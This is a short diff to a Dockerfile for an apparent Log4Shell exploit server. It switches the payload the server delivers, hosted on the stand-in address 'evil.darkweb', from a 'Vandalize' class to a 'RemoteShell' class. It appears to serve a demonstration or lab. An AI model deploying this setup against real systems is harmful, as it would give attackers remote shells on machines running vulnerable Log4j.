@@ -8,5 +8,5 @@ COPY --from=build target/log4shell-server-*-jar-with-dependencies.jar /server.ja
 EXPOSE 8000
 EXPOSE 9999
 
-CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#Vandalize", "8000", "9999", "Vandalize.class"]
+CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#RemoteShell", "8000", "9999", "RemoteShell.class"]
 
